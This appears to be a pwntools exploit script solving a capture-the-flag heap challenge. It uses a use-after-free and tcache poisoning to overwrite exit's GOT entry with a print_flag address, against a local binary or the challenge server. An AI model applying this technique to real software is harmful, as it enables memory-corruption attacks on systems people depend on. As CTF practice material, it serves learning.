#!/usr/bin/env python3
from pwn import *
context.arch = "amd64"
context.terminal = ["kitty-pwn"] # ["tmux", "split-window", "-h"]

PROCESS_PATH = "./vuln"

e = ELF(PROCESS_PATH, checksec=False)

EXIT_GOT = e.got['exit']
print(f"exit_got = {hex(EXIT_GOT)}")
PRINT_FLAG = 0x401654

if args.REMOTE:
    io = remote("chals.disorientation.cssa.club", 9824)
else:
    io = process(PROCESS_PATH)
    gdb.attach(io, gdbscript="""
set pagination off
b hear_tea
c
""")


def cmd_exit(io:process|remote):
    io.sendlineafter(b"> ", b"1")

def cmd_hear(io:process|remote):
    io.sendlineafter(b"> ", b"2")

def cmd_spill(io:process|remote, content:bytes=b"A"):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"chars)\n", content)

def cmd_update(io:process|remote, idx: int, content:bytes):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b" index: ", f"{idx}".encode())
    io.sendlineafter(b" plz:\n", content)

def cmd_remove(io:process|remote, idx: int):
    io.sendlineafter(b"> ", b"5")
    io.sendlineafter(b" index: ", f"{idx}".encode())

def exploit():
    # in idx 0, 1
    cmd_spill(io)
    cmd_spill(io)
    
    # now in tcache
    cmd_remove(io, 1)
    cmd_remove(io, 0)
    
    # No safe linking
    # UAF tcache poisoning CHUNK 0 -> CHUNK 1
    #            now CHUNK 0 -> EXIT_GOT
    cmd_update(io, 0, p64(EXIT_GOT))

    # cmd_hear(io) # To trigger the debugger
    
    cmd_spill(io)
    cmd_spill(io, p64(PRINT_FLAG)) #poisoned in idx 1

    # Trigger the exit() -> print_flag()
    cmd_exit(io)

if __name__ == "__main__":
    exploit()
    io.interactive()
